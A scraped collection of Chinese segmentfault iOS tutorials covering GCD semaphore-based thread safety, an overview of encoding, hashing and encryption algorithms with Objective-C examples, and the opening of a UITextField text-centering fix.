<p><strong>线程安全</strong>：如果你的代码所在的进程中有多个线程在同时运行，而这些线程可能会同时运行这段代码。如果每次运行结果和单线程运行的结果是一样的，而且其他的变量的值也和预期的是一样的，就是线程安全的。</p>
<p>若每个线程中对全局变量、静态变量只有读操作，而无写操作，一般来说，这个全局变量是线程安全的；若有多个线程同时执行写操作（更改变量），一般都需要考虑线程同步，否则的话就可能影响线程安全。</p>
<p><strong>线程同步</strong>：可理解为线程 A 和 线程 B 一块配合，A 执行到一定程度时要依靠线程 B 的某个结果，于是停下来，示意 B 运行；B 依言执行，再将结果给 A；A 再继续操作。</p>
<p>举个简单例子就是：两个人在一起聊天。两个人不能同时说话，避免听不清(操作冲突)。等一个人说完(一个线程结束操作)，另一个再说(另一个线程再开始操作)。</p>
<p>下面，我们模拟火车票售卖的方式，实现 NSThread 线程安全和解决线程同步问题。</p>
<p>场景：总共有50张火车票，有两个售卖火车票的窗口，一个是北京火车票售卖窗口，另一个是上海火车票售卖窗口。两个窗口同时售卖火车票，卖完为止。</p>
<h4>6.6.2.1 非线程安全（不使用 semaphore）</h4>
<p>先来看看不考虑线程安全的代码：</p>
<pre><code class=""objc"">/**
 * 非线程安全：不使用 semaphore
 * 初始化火车票数量、卖票窗口(非线程安全)、并开始卖票
 */
- (void)initTicketStatusNotSave {
    NSLog(@""currentThread---%@"",[NSThread currentThread]);  // 打印当前线程
    NSLog(@""semaphore---begin"");
    
    self.ticketSurplusCount = 50;
    
    // queue1 代表北京火车票售卖窗口
    dispatch_queue_t queue1 = dispatch_queue_create(""net.bujige.testQueue1"", DISPATCH_QUEUE_SERIAL);
    // queue2 代表上海火车票售卖窗口
    dispatch_queue_t queue2 = dispatch_queue_create(""net.bujige.testQueue2"", DISPATCH_QUEUE_SERIAL);
    
    __weak typeof(self) weakSelf = self;
    dispatch_async(queue1, ^{
        [weakSelf saleTicketNotSafe];
    });
    
    dispatch_async(queue2, ^{
        [weakSelf saleTicketNotSafe];
    });
}

/**
 * 售卖火车票(非线程安全)
 */
- (void)saleTicketNotSafe {
    while (1) {
        
        if (self.ticketSurplusCount &gt; 0) {  //如果还有票，继续售卖
            self.ticketSurplusCount--;
            NSLog(@""%@"", [NSString stringWithFormat:@""剩余票数：%d 窗口：%@"", self.ticketSurplusCount, [NSThread currentThread]]);
            [NSThread sleepForTimeInterval:0.2];
        } else { //如果已卖完，关闭售票窗口
            NSLog(@""所有火车票均已售完"");
            break;
        }
        
    }
}</code></pre>
<blockquote>输出结果（部分）：<br>2018-02-23 22:25:35.789072+0800 YSC-GCD-demo[20712:5258914] currentThread---&lt;NSThread: 0x604000068880&gt;{number = 1, name = main}<br>2018-02-23 22:25:35.789260+0800 YSC-GCD-demo[20712:5258914] semaphore---begin<br>2018-02-23 22:25:35.789641+0800 YSC-GCD-demo[20712:5259176] 剩余票数：48 窗口：&lt;NSThread: 0x60000027db80&gt;{number = 3, name = (null)}<br>2018-02-23 22:25:35.789646+0800 YSC-GCD-demo[20712:5259175] 剩余票数：49 窗口：&lt;NSThread: 0x60000027e740&gt;{number = 4, name = (null)}<br>2018-02-23 22:25:35.994113+0800 YSC-GCD-demo[20712:5259175] 剩余票数：47 窗口：&lt;NSThread: 0x60000027e740&gt;{number = 4, name = (null)}<br>2018-02-23 22:25:35.994129+0800 YSC-GCD-demo[20712:5259176] 剩余票数：46 窗口：&lt;NSThread: 0x60000027db80&gt;{number = 3, name = (null)}<br>2018-02-23 22:25:36.198993+0800 YSC-GCD-demo[20712:5259176] 剩余票数：45 窗口：&lt;NSThread: 0x60000027db80&gt;{number = 3, name = (null)}<br>...</blockquote>
<p>可以看到在不考虑线程安全，不使用 semaphore 的情况下，得到票数是错乱的，这样显然不符合我们的需求，所以我们需要考虑线程安全问题。</p>
<h4>6.6.2.2 线程安全（使用 semaphore 加锁）</h4>
<p>考虑线程安全的代码：</p>
<pre><code class=""objc"">/**
 * 线程安全：使用 semaphore 加锁
 * 初始化火车票数量、卖票窗口(线程安全)、并开始卖票
 */
- (void)initTicketStatusSave {
    NSLog(@""currentThread---%@"",[NSThread currentThread]);  // 打印当前线程
    NSLog(@""semaphore---begin"");
    
    semaphoreLock = dispatch_semaphore_create(1);
    
    self.ticketSurplusCount = 50;
    
    // queue1 代表北京火车票售卖窗口
    dispatch_queue_t queue1 = dispatch_queue_create(""net.bujige.testQueue1"", DISPATCH_QUEUE_SERIAL);
    // queue2 代表上海火车票售卖窗口
    dispatch_queue_t queue2 = dispatch_queue_create(""net.bujige.testQueue2"", DISPATCH_QUEUE_SERIAL);
    
    __weak typeof(self) weakSelf = self;
    dispatch_async(queue1, ^{
        [weakSelf saleTicketSafe];
    });
    
    dispatch_async(queue2, ^{
        [weakSelf saleTicketSafe];
    });
}

/**
 * 售卖火车票(线程安全)
 */
- (void)saleTicketSafe {
    while (1) {
        // 相当于加锁
        dispatch_semaphore_wait(semaphoreLock, DISPATCH_TIME_FOREVER);
        
        if (self.ticketSurplusCount &gt; 0) {  //如果还有票，继续售卖
            self.ticketSurplusCount--;
            NSLog(@""%@"", [NSString stringWithFormat:@""剩余票数：%d 窗口：%@"", self.ticketSurplusCount, [NSThread currentThread]]);
            [NSThread sleepForTimeInterval:0.2];
        } else { //如果已卖完，关闭售票窗口
            NSLog(@""所有火车票均已售完"");
            
            // 相当于解锁
            dispatch_semaphore_signal(semaphoreLock);
            break;
        }
        
        // 相当于解锁
        dispatch_semaphore_signal(semaphoreLock);
    }
}</code></pre>
<blockquote>输出结果为：<br>2018-02-23 22:32:19.814232+0800 YSC-GCD-demo[20862:5290531] currentThread---&lt;NSThread: 0x6000000783c0&gt;{number = 1, name = main}<br>2018-02-23 22:32:19.814412+0800 YSC-GCD-demo[20862:5290531] semaphore---begin<br>2018-02-23 22:32:19.814837+0800 YSC-GCD-demo[20862:5290687] 剩余票数：49 窗口：&lt;NSThread: 0x6040002709c0&gt;{number = 3, name = (null)}<br>2018-02-23 22:32:20.017745+0800 YSC-GCD-demo[20862:5290689] 剩余票数：48 窗口：&lt;NSThread: 0x60000046c640&gt;{number = 4, name = (null)}<br>2018-02-23 22:32:20.222039+0800 YSC-GCD-demo[20862:5290687] 剩余票数：47 窗口：&lt;NSThread: 0x6040002709c0&gt;{number = 3, name = (null)}<br>...<br>2018-02-23 22:32:29.024817+0800 YSC-GCD-demo[20862:5290689] 剩余票数：4 窗口：&lt;NSThread: 0x60000046c640&gt;{number = 4, name = (null)}<br>2018-02-23 22:32:29.230110+0800 YSC-GCD-demo[20862:5290687] 剩余票数：3 窗口：&lt;NSThread: 0x6040002709c0&gt;{number = 3, name = (null)}<br>2018-02-23 22:32:29.433615+0800 YSC-GCD-demo[20862:5290689] 剩余票数：2 窗口：&lt;NSThread: 0x60000046c640&gt;{number = 4, name = (null)}<br>2018-02-23 22:32:29.637572+0800 YSC-GCD-demo[20862:5290687] 剩余票数：1 窗口：&lt;NSThread: 0x6040002709c0&gt;{number = 3, name = (null)}<br>2018-02-23 22:32:29.840234+0800 YSC-GCD-demo[20862:5290689] 剩余票数：0 窗口：&lt;NSThread: 0x60000046c640&gt;{number = 4, name = (null)}<br>2018-02-23 22:32:30.044960+0800 YSC-GCD-demo[20862:5290687] 所有火车票均已售完<br>2018-02-23 22:32:30.045260+0800 YSC-GCD-demo[20862:5290689] 所有火车票均已售完</blockquote>
<p>可以看出，在考虑了线程安全的情况下，使用 <code>dispatch_semaphore</code></p>
<h2>机制之后，得到的票数是正确的，没有出现混乱的情况。我们也就解决了多个线程同步的问题。</h2>
<p>参考资料：</p>
<ul><li><a href=""http://blog.csdn.net/liuyang11908/article/details/70757534"" rel=""nofollow noreferrer"">iOS GCD之dispatch_semaphore（信号量）</a></li></ul>
<hr>

                ", iOS多线程：『GCD』详尽总结,1531971865,401,1,954,1,1,https://segmentfault.com/a/1190000014850416
11,1,0,6,"
                    
<h1>iOS数据安全-编码和加密算法</h1>
<h2>Base64编码</h2>
<p>Base64编码是一种用64个字符（其实是65个字符，“=”是填充字符）来表示任意二进制数据的方法，编码后的数据是一个字符串。</p>
<ul>
<li>
<p>原理</p>
<ol>
<li>准备一个包含64个字符的数组，其中包含的字符为：A-Z、a-z、0-9、+、/。</li>
<li>64个字符需要6位二进制来表示，表示成数值为0~63。</li>
<li>对二进制数据进行处理，每3个字节一组，一共是3x8=24bit，再划为4小组，每小组正好6个bit，然后查表，获得相应的4个字符，就是编码后的字符串。</li>
<li>如果数据的字节数不是3的倍数，需在原数据后面添加1个或2个零值字节，使其字节数是3的倍数。然后，在编码后的字符串后面添加1个或2个等号“=”，表示所添加的零值字节数。解码的时候，会自动去掉。</li>
</ol>
</li>
<li>
<p>特点</p>
<ol>
<li>Base64编码是可逆的编码方式，从编码的方式即可逆推出解码的方式。</li>
<li>Base64编码会把3字节的二进制数据编码为4字节的文本数据，长度增加33%。</li>
<li>标准的Base64编码后可能出现字符“+”和“/”，在URL中就不能直接作为参数。</li>
<li>可以自己定义64个字符的排列顺序，这样就可以自定义Base64编码。</li>
<li>Base64编码的长度永远是4的倍数。</li>
</ol>
</li>
<li>
<p>应用</p>
<ol>
<li>Base64适用于小段内容的编码，比如数字证书签名、Cookie的内容等。</li>
<li>Base64也会经常用作一个简单的“加密”来保护某些数据（标准Base64编码解码无需额外信息即完全可逆），而真正的加密通常都比较繁琐。</li>
<li>HTML内嵌Base64编码图片：绝大多数现代浏览器都支持一种名为 Data URLs 的特性，允许使用Base64对图片或其他文件的二进制数据进行编码，将其作为文本字符串嵌入网页中。</li>
<li>电子邮件系统：SMTP协议一开始是基于纯ASCII文本的，对于二进制文件（比如邮件附件中的图像、声音等）的处理并不好，所以后来新增MIME标准来编码二进制文件，使其能够通过SMTP协议传输。</li>
</ol>
</li>
<li>
<p>iOS代码示例</p>
<pre><code class=""objc"">NSString *base0 = [data base64EncodedStringWithOptions:0];
NSString *base1 = [data base64EncodedStringWithOptions:NSDataBase64Encoding64CharacterLineLength]; //每行最大长度64，行之间添加“\r\n”
NSString *base2 = [data base64EncodedStringWithOptions:NSDataBase64Encoding76CharacterLineLength]; //每行最大长度76，行之间添加“\r\n”
NSString *base3 = [data base64EncodedStringWithOptions:NSDataBase64EncodingEndLineWithCarriageReturn];
NSString *base4 = [data base64EncodedStringWithOptions:NSDataBase64EncodingEndLineWithLineFeed];</code></pre>
</li>
</ul>
<h2>消息摘要算法</h2>
<p>消息摘要算法主要分为三类，即：消息摘要（Message Digest:MD)、安全散列(Secure Hash Algorithm:SHA)和消息认证码(Message Authentication Code:MAC)，主要作用是验证数据的完整性。消息摘要算法的主要特点有:①变长输入，定长输出。②单向、不可逆。③虽然“碰撞”是肯定存在的，但是很难找到“碰撞”。</p>
<h3>MD算法</h3>
<p>MD算法系列最新为MD5，Message-Digest Algorithm 5（信息-摘要算法5）一种被广泛使用的散列算法，可以产生出一个128位的散列值（hash value），用于确保信息传输完整一致。下面以MD5为例进行分析：</p>
<ul>
<li>
<p>原理</p>
<ol>
<li>输入信息进行填充，使其位长对512求余的结果等于448。如果输入信息的长度(bit)对512求余的结果不等于448，就需要填充使得对512求余的结果等于448。填充的方法是填充一个1和n个0。填充完后，信息的位长（Bits Length）将被扩展至N*512+448，N为一个非负整数，N可以是零。</li>
<li>记录信息长度，在第一步的结果后面附加一个以64位二进制表示的填充前信息长度（单位为Bit），如果二进制表示的填充前信息长度超过64位，则取低64位。经过这两步的处理，信息的位长=N<em>512+448+64=(N+1）</em>512，即长度恰好是512的整数倍。这样做的原因是为满足后面处理中对信息长度的要求。</li>
<li>初始化变量，初始的128位值为初试链接变量，这些参数用于第一轮的运算，以大端字节序来表示，他们分别为A=0x01234567，B=0x89ABCDEF，C=0xFEDCBA98，D=0x76543210。每一个变量给出的数值是高字节存于内存低地址，低字节存于内存高地址，即大端字节序。在程序中变量A、B、C、D的值分别为0x67452301，0xEFCDAB89，0x98BADCFE，0x10325476。</li>
<li>
<p>处理分组数据，分组数为N+1（块长：512位）,每个分组进行4轮变换。<br>① 四个非线性函数，用于4轮变换。</p>
<pre><code class=""c++"">F(X,Y,Z)=(X&amp;Y)|((~X)&amp;Z)
G(X,Y,Z)=(X&amp;Z)|(Y&amp;(~Z))
H(X,Y,Z)=X^Y^Z
I(X,Y,Z)=Y^(X|(~Z))</code></pre>
<p>②每组的4轮变换</p>
<pre><code class=""c++"">/* F ：一个非线性函数，一个函数运算一次 Mi ：表示一个 32-bits 的输入数据 Ki：表示一个 32-bits 常数，用来完成每次不同的计算。假设Mj表示消息的第j个子分组（从0到15），常数ti是4294967296*abs( sin(i) ）的整数部分，i 取值从1到64，单位是弧度。（4294967296=2^(32)）*/
FF(a ,b ,c ,d ,Mj ,s ,ti) 操作为 a = b + ( (a + F(b,c,d) + Mj + ti) &lt;&lt; s) // 第一轮用，共16次
GG(a ,b ,c ,d ,Mj ,s ,ti) 操作为 a = b + ( (a + G(b,c,d) + Mj + ti) &lt;&lt; s) // 第二轮用，共16次
HH(a ,b ,c ,d ,Mj ,s ,ti) 操作为 a = b + ( (a + H(b,c,d) + Mj + ti) &lt;&lt; s)  // 第三轮用，共16次
II(a ,b ,c ,d ,Mj ,s ,ti) 操作为 a = b + ( (a + I(b,c,d) + Mj + ti) &lt;&lt; s)  // 第四轮用，共16次</code></pre>
<p>③ 每组完成之后，将a、b、c、d分别在原来基础上再加上A、B、C、D。即a = a + A，b = b + B，c = c + C，d = d + D，然后用下一分组数据继续运行以上算法。<br>④ 最后的输出是a、b、c和d的级联，由四个32位分组组成，将这四个32位分组级联后将生成一个128位散列值。</p>
</li>
</ol>
</li>
<li>
<p>特点</p>
<ol>
<li>不可逆：根据输出值，不能得到原始的明文。</li>
<li>压缩性：任意长度的数据，算出的MD5值长度都是固定的。</li>
<li>抗修改性：对原数据进行任何改动，哪怕只修改1个字节，所得到的MD5值都有很大区别。</li>
<li>强抗碰撞：已知原数据和其MD5值，想找到一个具有相同MD5值的数据（即伪造数据）是非常困难的。</li>
</ol>
</li>
<li>应用<br>目前，MD5算法因其普遍、稳定、快速的特点，仍广泛应用于普通数据的错误检查领域。但是MD5演算法无法防止碰撞（collision），因此不适用于安全性认证，如SSL公开金钥认证或是数位签章等用途。MD5算法主要运用在数字签名、文件完整性验证以及口令加密等方面（一致性校验）。</li>
<li>注意<br>MD5后所得到的通常是32位的编码，16位编码就是从32位MD5散列中把中间16位提取出来！其实破解16位MD5散列要比破解32位MD5散列还慢，因为他多了一个步骤,就是使用32位加密后再把中间16位提取出来, 然后再进行对比。</li>
<li>
<p>iOS代码示例</p>
<pre><code class=""objc"">//相关类文件：#include &lt;CommonCrypto/CommonDigest.h&gt;
-(NSString *)md5 {
if(self == nil || [self length] == 0){
    return nil;
}
const char *src = [self UTF8String];
unsigned char result[CC_MD5_DIGEST_LENGTH];
CC_MD5(src, (CC_LONG)strlen(src), result);
return [NSString stringWithFormat:@""%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x"",
        result[0], result[1], result[2], result[3], result[4], result[5], result[6], result[7],
        result[8], result[9], result[10], result[11], result[12], result[13], result[14], result[15]
        ];
}</code></pre>
</li>
</ul>
<h3>SHA算法</h3>
<p>安全散列算法（英语：Secure Hash Algorithm，缩写为SHA）是一个密码散列函数家族，是FIPS所认证的安全散列算法。能计算出一个数字消息所对应到的，长度固定的字符串（又称消息摘要）的算法。且若输入的消息不同，它们对应到不同字符串的机率很高。</p>
<ul>
<li>SHA-0：1993年发布，当时称做安全散列标准（Secure Hash Standard），发布之后很快就被NSA撤回，是SHA-1的前身。</li>
<li>SHA-1：1995年发布，SHA-1在许多安全协议中广为使用，包括TLS和SSL、PGP、SSH、S/MIME和IPsec，曾被视为是MD5（更早之前被广为使用的散列函数）的后继者。但SHA-1的安全性在2000年以后已经不被大多数的加密场景所接受。2017年荷兰密码学研究小组CWI和Google正式宣布攻破了SHA-1[1]。Microsoft、Google以及Mozilla都宣布，它们旗下的浏览器将在2017年前停止接受使用SHA-1算法签名的SSL证书。2017年2月23日，CWI Amsterdam与Google宣布了一个成功的SHA-1碰撞攻击。</li>
<li>SHA-2：2001年发布，包括SHA-224、SHA-256、SHA-384、SHA-512、SHA-512/224、SHA-512/256。虽然至今尚未出现对SHA-2有效的攻击，它的算法跟SHA-1* 基本上仍然相似；因此有些人开始发展其他替代的散列算法。</li>
<li>SHA-3：2015年正式发布，SHA-3并不是要取代SHA-2，因为SHA-2目前并没有出现明显的弱点。由于对MD5出现成功的破解，以及对SHA-0和SHA-1出现理论上破解的方法，NIST感觉需要一个与之前算法不同的，可替换的加密散列算法，也就是现在的SHA-3。</li>
</ul>
<p>下表中的中继散列值（internal state）表示对每个数据区块压缩散列过后的中继值（internal hash sum）。<br><span class=""img-wrap""><img data-src=""/img/bVbajfX?w=1137&amp;h=645"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<ul><li>
<p>iOS代码示例</p>
<pre><code class=""objc"">// 类似MD5，相关类文件：#include &lt;CommonCrypto/CommonDigest.h&gt;
-(NSString *)sha1 {
    const char *cstr = [self cStringUsingEncoding:NSUTF8StringEncoding];
    NSData *data = [NSData dataWithBytes:cstr length:self.length];

    uint8_t digest[CC_SHA1_DIGEST_LENGTH];
    CC_SHA1(data.bytes, (unsigned int)data.length, digest);
    NSMutableString *output = [NSMutableString stringWithCapacity:CC_SHA1_DIGEST_LENGTH * 2];

    for(int i=0; i &lt; CC_SHA1_DIGEST_LENGTH; i++) {
        [output appendFormat:@""%02x"", digest[i]];
    }
    return output;
}
</code></pre>
</li></ul>
<h3>MAC算法</h3>
<p>MAC（Message Authentication Code，消息认证码算法）结合了MD5和SHA算法的优势，并加入密钥的支持，是一种更为安全的消息摘要算法。消息认证码的算法中，通常会使用带密钥的散列函数（HMAC），或者块密码的带认证工作模式（如CBC-MAC）。信息鉴别码不能提供对信息的保密，若要同时实现保密认证，同时需要对信息进行加密。下面以HMAC为例进行分析：</p>
<ul>
<li>
<p>原理<br>1.计算HMAC需要一个散列函数hash（可以是md5或者sha-1）和一个密钥key。<br>2.算法公式</p>
<pre><code class=""c++"">HMAC（K，M）=H（K⊕opad∣H（K⊕ipad∣M））
H 代表所采用的HASH算法(如SHA-256)
K 代表认证密码
Ko 代表HASH算法的密文
M 代表一个消息输入
B 代表H中所处理的块大小，这个大小是处理块大小，而不是输出hash的大小</code></pre>
<p>3.运算步骤</p>
<pre><code class=""c++"">First-Hash = H(Ko XOR Ipad || (data to auth))
Second-Hash = H(Ko XOR Opad || First-Hash)
(1) 在密钥K后面添加0来创建一个字长为B的字符串。(例如，如果K的字长是20字节，B=64字节，则K后会加入44个零字节0x00)
(2) 将上一步生成的B字长的字符串与ipad做异或运算。
(3) 将数据流text填充至第二步的结果字符串中。
(4) 用H作用于第三步生成的数据流。
(5) 将第一步生成的B字长字符串与opad做异或运算。
(6) 再将第四步的结果填充进第五步的结果中。
(7) 用H作用于第六步生成的数据流，输出最终结果</code></pre>
</li>
<li>
<p>应用</p>
<p>HMAC主要应用在身份验证中，过程如下：</p>
<ol>
<li>客户端发出登录请求（假设是浏览器的GET请求）。</li>
<li>服务器返回一个随机值，并在会话中记录这个随机值。</li>
<li>客户端将该随机值作为密钥，和用户密码进行hmac运算，然后提交给服务器。</li>
<li>服务器读取用户数据库中的用户密码和步骤2中发送的随机值做与客户端一样的hmac运算，然后与用户发送的结果比较，如果结果一致则验证用户合法。</li>
</ol>
</li>
<li>
<p>iOS代码示例</p>
<pre><code class=""objc"">//相关类文件：#include &lt;CommonCrypto/CommonHMAC.h&gt;
-(NSString*)hmacMD5StringWithKey:(NSString*)key{
    const char* keyData = key.UTF8String;
    const char* strData =self.UTF8String;
    uint8_tbuffer[CC_MD5_DIGEST_LENGTH];  //以MD5为例
    CCHmac(kCCHmacAlgMD5, keyData,strlen(keyData), strData,strlen(strData), buffer);
    return[self stringFromBytes:buffer length:CC_MD5_DIGEST_LENGTH];
}</code></pre>
</li>
</ul>
<h2>对称加密算法</h2>
<p>在对称加密算法中，使用的密钥只有一个，发收信双方都使用这个密钥对数据进行加密和解密，这就要求解密方事先必须知道加密密钥。密码学中，分组（block）密码的工作模式（mode of operation）允许使用同一个分组密码密钥对多于一块的数据进行加密，并保证其安全性。分组密码自身只能加密长度等于密码分组长度的单块数据，若要加密变长数据，则数据必须先被划分为一些单独的密码块。通常而言，最后一块数据也需要使用合适填充方式将数据扩展到匹配密码块大小的长度。一种工作模式描述了加密每一数据块的过程，并常常使用基于一个通常称为初始化向量的附加输入值以进行随机化，以保证安全。工作模式主要用来进行加密和认证。虽然工作模式通常应用于对称加密，它亦可以应用于公钥加密，例如在原理上对RSA进行处理，但在实用中，公钥密码学通常不用于加密较长的信息，而是使用结合对称加密和公钥加密的混合加密方案。</p>
<ul>
<li>
<p>工作模式：</p>
<pre><code class=""objc"">enum {
    kCCModeECB      = 1, // 电码本模式（Electronic Codebook Book (ECB)）
    kCCModeCBC      = 2, // 密码分组链接模式（Cipher Block Chaining (CBC)）
    kCCModeCFB      = 3, // 密码反馈模式（Cipher FeedBack (CFB)）
    kCCModeCTR      = 4, // 计数器模式（Counter (CTR)）
    kCCModeF8       = 5, // Unimplemented for now (not included)
    kCCModeLRW      = 6, // Unimplemented for now (not included)
    kCCModeOFB      = 7, // 输出反馈模式（Output FeedBack (OFB)
    kCCModeXTS      = 8, // XEX-based Tweaked CodeBook Mode.
    kCCModeRC4      = 9, // RC4 as a streaming cipher is handled internally as a mode.
    kCCModeCFB8     = 10, // Cipher Feedback Mode producing 8 bits per round.
};</code></pre>
</li>
<li>
<p>填充模式：</p>
<ol>
<li>不同的语言环境有不同的填充模式，比较常见的例如：NoPadding、PKCS5Padding、PKCS7Padding、ISO10126Padding。</li>
<li>
<p>iOS支持的填充模式有PKCS7Padding（kCCOptionPKCS7Padding表示，缺几位就补几个几）。</p>
<pre><code class=""objc"">enum {
ccNoPadding         = 0,
ccPKCS7Padding      = 1,
};</code></pre>
</li>
</ol>
</li>
<li>安全级别：AES &gt; 3DES &gt; DES （不同的算法对应的密钥长度不同）</li>
</ul>
<h3>DES</h3>
<ul>
<li>DES算法是第一个公开的密码算法，它是一个迭代型分组密码算法，分组长度64位，密钥长度64位，有效密钥长度56位，迭代圈数16圈，圈密钥长度48位。但由于快速DES芯片的大量生产，使得DES仍能暂时继续使用，为提高安全强度，通常使用独立密钥的三级DES。但是DES迟早要被AES代替。密钥表面上是64位的，然而只有其中的56位被实际用于算法，其余8位可以被用于奇偶校验，并在算法中被丢弃。因此，DES的有效密钥长度仅为56位。</li>
<li>3DES（即Triple DES）是DES向AES过渡的加密算法,它使用3条64位的密钥对数据进行三次加密。3DES即是设计用来提供一种相对简单的方法，即通过增加DES的密钥长度来避免类似的攻击，而不是设计一种全新的块密码算法。</li>
<li>3DES密码选项<br>标准定义了三种密钥选项（三次密钥分别为K1/K2/K3）：<br>密钥选项1：三个密钥是独立的强度最高——拥有3 x 56 = 168个独立的密钥位。<br>密钥选项2：K1和K2是独立的，而K3=K1——安全性稍低，拥有2 x 56 = 112个独立的密钥位，该选项比简单的应用DES两次的强度较高，即使用K1和K2，因为它可以防御中途相遇攻击。<br>密钥选项3：三个密钥均相等，即K1=K2=K3——钥选项3等同与DES，只有56个密钥位<br>密钥选项1的</li>
<li>
<p>3DES原理<br>3DES使用“密钥包”，其包含3个DES密钥，K1，K2和K3，均为56位（除去奇偶校验位）。加密算法为：</p>
<pre><code>密文 = EK3(DK2(EK1(明文))) 即：使用K1为密钥进行DES加密，再用K2为密钥进行DES“解密”，最后以K3进行DES加密。</code></pre>
<p>而解密则为其反过程：</p>
<pre><code>明文 = DK1(EK2(DK3(密文))) 即：以K3解密，以K2“加密”，最后以K1解密。</code></pre>
<p>每次加密操作都只处理64位数据，称为一块。无论是加密还是解密，中间一步都是前后两步的逆。这种做法提高了使用密钥选项2时的算法强度，并在使用密钥选项3时与DES兼容。</p>
</li>
</ul>
<h3>AES</h3>
<p>AES加密算法（Advanced Encryption Standard，AES），是美国联邦政府采用的一种区块加密标准。这个标准用来替代原先的DES。AES的基本要求是，采用对称分组密码体制，密钥的长度最少支持为128、192、256，但分组长度为128位，算法应易于各种硬件和软件实现。三种密钥长度对比如下：<br><span class=""img-wrap""><img data-src=""/img/remote/1460000014853077"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图例"" title=""图例""></span></p>
<ul><li>
<p>iOS代码示例</p>
<pre><code class=""objc""> //AES128密钥长度128位（16x8）,通常16个字符，例如：”0123456789123456“
 -(NSData *)AES128_DecryptWithKey:(NSString *)key{
 char keyPtr[kCCKeySizeAES128 + 1];
 bzero(keyPtr, sizeof(keyPtr));
 [key getCString:keyPtr maxLength:sizeof(keyPtr) encoding:NSUTF8StringEncoding];
 size_t bufferSize = self.length + kCCBlockSizeAES128;
 void *buffer = malloc(bufferSize);
 size_t numBytesEncrypted = 0;
 // CCCrypt 是常用简易方法，支持ECB和CBC两种工作模式，如果CCCrypt不能满足，可换用CCCryptorCreateWithMode方法
 CCCryptorStatus cryptStatus = CCCrypt(kCCDecrypt,
                                       kCCAlgorithmAES128,
                                       kCCOptionPKCS7Padding | kCCOptionECBMode, // 采用ECB工作模式，PCKS7填充
                                       keyPtr,                 //密钥长度128位
                                       kCCBlockSizeAES128,
                                       NULL,                     //ECB模式不需要初始化向量
                                       self.bytes,
                                       self.length,
                                       buffer,
                                       bufferSize,
                                       &amp;numBytesEncrypted);
 if (cryptStatus == kCCSuccess) {
     return [NSData dataWithBytesNoCopy:buffer length:numBytesEncrypted];
 }
 free(buffer);
 return nil;
 }</code></pre>
</li></ul>
<h2>非对称加密算法</h2>
<p>是密码学的一种算法，它需要两个密钥，一个是公开密钥，另一个是私有密钥；一个用作加密的时候，另一个则用作解密。使用其中一个密钥把明文加密后所得的密文，只能用相对应的另一个密钥才能解密得到原本的明文；甚至连最初用来加密的密钥也不能用作解密。由于加密和解密需要两个不同的密钥，故被称为非对称加密。与对称密码相比，非对称加密密钥交换安全，安全性高，不过，公钥加密在在计算上相当复杂，性能欠佳、远远不比对称加密；因此，在一般实际情况下，往往通过公钥加密来随机创建临时的对称秘钥，然后才通过对称加密来传输大量、主体的数据。常见的公钥加密算法有：RSA、ElGamal、背包算法、Rabin（RSA的特例）、迪菲－赫尔曼密钥交换协议中的公钥加密算法、椭圆曲线加密算法（英语：Elliptic Curve Cryptography, ECC）。</p>
<h3>RSA</h3>
<p>RSA是目前最有影响力的公钥加密算法，对极大整数做因数分解的难度决定了RSA算法的可靠性。</p>
<ul>
<li>
<p>原理<br>RSA公钥密码体制描述如下：（m为明文，c为密文，利用欧拉公式）</p>
<ol>
<li>选取两个大素数p,q。p和q保密。</li>
<li>计算n=pq，r=(p-1)(q-1)。n公开，r保密。</li>
<li>随机选取正整数1&lt;e&lt;r，满足gcd(e,r)=1.e是公开的加密密钥。</li>
<li>计算d，满足de=1(mod r).d是保密的解密密钥</li>
<li>加密变换：　　c=m^e mod n</li>
<li>解密变换：　　m=c^d mod n</li>
</ol>
</li>
<li>
<p>特点</p>
<ol>
<li>两个密钥：个是公开密钥，另一个是私有密钥。</li>
<li>安全性高，密钥越长，它就越难破解。</li>
</ol>
</li>
<li>
<p>安全性</p>
<ol>
<li>针对RSA最流行的攻击一般是基于大数因数分解。1999年，RSA-155 (512 bits)被成功分解，花了五个月时间（约8000 MIPS年）和224 CPU hours在一台有3.2G中央内存的Cray C916计算机上完成。</li>
<li>2009年12月12日，编号为RSA-768（768 bits, 232 digits）数也被成功分解[10]。这一事件威胁了现通行的1024-bit密钥的安全性，普遍认为用户应尽快升级到2048-bit或以上。</li>
</ol>
</li>
<li>
<p>应用</p>
<ol>
<li>加密：公钥加密私钥解密，主要用于将数据资料加密不被其他人非法获取，保证数据安全性。使用公钥将数据资料加密，只有私钥可以解密。即使密文在网络上被第三方获取由于没有私钥则无法解密。从而保证数据安全性。</li>
<li>认证（签名）：私钥加密公钥解密，主要用于身份验证，判断某个身份的真实性（没有被篡改）。使用私钥加密之后，用对应的公钥解密从而验证身份真实性。（例如SSH登录）</li>
</ol>
</li>
</ul>

                ", iOS数据安全-编码和加密算法,1531971866,295,1,347,1,1,https://segmentfault.com/a/1190000014797282
12,1,0,6,"
                    
<p><strong>2018-5-17重点补充</strong><br>在我在自己的项目中尝试用下面的解决方案的时候，发现项目真的是“中毒太深”。在项目中添加扩展之后，发现有的UITextField文字可以垂直居中了，有的却还是不能。真是一脸懵逼啊！！！经过逐行对比代码发现以下重要规律：</p>
<p>当UITextField的clipsToBounds = YES或者 layer.masksToBounds = YES的时候，即使加上我下面的扩展也是没法解决问题的，文字还是无法垂直居中。亲测，不将这两个属性设置为YES的同时，添加该扩展可以解决问题。</p>
<p>当UITextField的clipsToBounds = YES或者 layer.masksToBounds = YES的时候输入文字超长时文字不会超过文本框的范围。而设置为NO的话，输入超长文本的时候的效果如微信和淘宝的搜索框，输入过程中会有个超出文本框范围的动画，不过这个效果比文本不垂直居中的效果更容易让人接受。</p>
<hr>
<p>最近发现UITextField在iOS 10下输入中文的过程中，文字显示会“掉下去”或者“文字下沉”，也不知道该怎么描述了（就是UITextField文字没有垂直居中），正好我的手机还是iOS 10的系统，一图胜千言，下面上效果：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000014745078"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""简书.png"" title=""简书.png""></span></p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000014745079"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""美团.png"" title=""美团.png""></span></p>
